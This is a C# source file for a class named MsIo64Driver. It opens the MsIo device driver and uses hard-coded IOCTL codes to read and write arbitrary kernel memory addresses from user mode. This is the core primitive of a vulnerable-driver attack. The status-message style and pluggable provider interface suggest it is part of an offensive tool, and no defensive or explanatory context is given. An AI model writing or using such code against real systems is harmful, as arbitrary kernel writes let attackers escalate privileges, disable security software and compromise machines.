using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class MsIo64Driver : IProvider
{
	private const string DeviceName = "\\\\.\\MsIo";
	private const uint IOCTL_READ = 0x9C402404;
	private const uint IOCTL_WRITE = 0x9C403404;
	private SafeFileHandle _handle;

	public bool Open()
	{
		_handle = NativeMethods.CreateFile(DeviceName, FileAccess.ReadWrite,
			FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);

		if (_handle == null || _handle.IsInvalid || _handle.IsClosed)
		{
			Console.WriteLine("[-] CreateFile failed for " + DeviceName);
			return false;
		}

		return true;
	}

	public void Close()
	{
		_handle?.Dispose();
	}

	public bool ReadKernelMemory(ulong address, byte[] buffer, int size)
	{
		var req = new NativeMethods.RWStruct { Address = address };
		int bytesReturned = 0;
		return NativeMethods.DeviceIoControl(_handle, IOCTL_READ,
			ref req, Marshal.SizeOf<NativeMethods.RWStruct>(),
			buffer, size, ref bytesReturned, IntPtr.Zero);
	}

	public bool WriteKernelMemory(ulong address, byte[] data, int size)
	{
		var req = new NativeMethods.RWStruct
		{
			Address = address,
			Value = BitConverter.ToUInt64(data, 0)
		};
		int bytesReturned = 0;
		return NativeMethods.DeviceIoControl(_handle, IOCTL_WRITE,
			ref req, Marshal.SizeOf<NativeMethods.RWStruct>(),
			IntPtr.Zero, 0, ref bytesReturned, IntPtr.Zero);
	}
}
